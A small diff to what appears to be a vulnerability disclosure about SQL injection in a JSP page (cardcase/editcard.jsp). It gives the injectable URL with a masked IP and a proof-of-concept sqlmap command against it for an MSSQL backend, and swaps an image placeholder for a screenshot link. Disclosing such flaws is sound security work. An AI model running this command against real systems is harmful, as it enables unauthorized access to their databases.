@@ -18,5 +18,6 @@ Injection url: http://xx.xx.xx.xx:8081/cardcase/editcard.jsp?person_id=2&id=1&cl
 poc:
 python .\sqlmap.py -u "http://xx.xx.xx.xx:8081/cardcase/editcard.jsp?person_id=2&id=1&classid=1" --random-agent --dbms=mssql
 
-![Uploading image.png…]()
+
+![sql](https://github.com/user-attachments/assets/350e443e-b01b-44a8-87b1-439f0c19d60b)
 
